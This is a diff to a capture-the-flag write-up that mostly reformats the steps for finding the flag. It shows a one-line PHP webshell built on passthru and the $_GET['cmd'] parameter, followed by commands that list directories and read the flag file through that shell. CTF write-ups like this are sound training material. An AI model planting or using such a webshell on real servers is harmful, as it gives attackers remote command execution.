@@ -223,10 +223,16 @@ Simple one-liner webshell from [here](https://github.com/JohnTroony/php-webshell
 
 So simply, `echo "<?php echo passthru($_GET['cmd']); ?>" > test.php`
 Then using the php web shell, we can run commands  below to find the flag
+
 `ls ../`
+
 `ls ../../`
+
 `ls ../../../`
-`cat /flag_022dc5a58d33.txt` *This is because the path of `../../../` is `/`*
+
+`cat /flag_022dc5a58d33.txt`
+
+*This is because the path of `../../../` is `/`*
 
 ### Flag
 ```
